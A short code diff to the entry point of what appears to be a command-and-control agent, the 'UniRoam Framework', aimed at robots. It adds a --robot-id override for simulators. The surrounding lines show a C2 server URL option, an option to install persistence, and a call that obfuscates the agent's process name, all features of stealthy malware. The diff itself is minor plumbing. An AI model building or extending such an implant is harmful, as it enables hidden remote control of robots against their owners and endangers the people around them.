@@ -447,6 +447,7 @@ def main():
         epilog='Part of the UniRoam Framework - Use responsibly.'
     )
     parser.add_argument('--c2-url', type=str, help='C2 server URL')
+    parser.add_argument('--robot-id', type=str, help='Robot ID (for simulators)')
     parser.add_argument('--install', action='store_true', help='Install persistence and exit')
     parser.add_argument('--debug', action='store_true', help='Enable debug mode')
     args = parser.parse_args()
@@ -466,6 +467,11 @@ def main():
         sys.exit(0 if success else 1)
     
     # Normal operation
+    # Override robot ID if provided (for simulators)
+    if args.robot_id:
+        agent.robot_id = args.robot_id
+        agent.c2_client.robot_id = args.robot_id
+    
     # Obfuscate process name
     ProcessObfuscation.set_process_name()
     
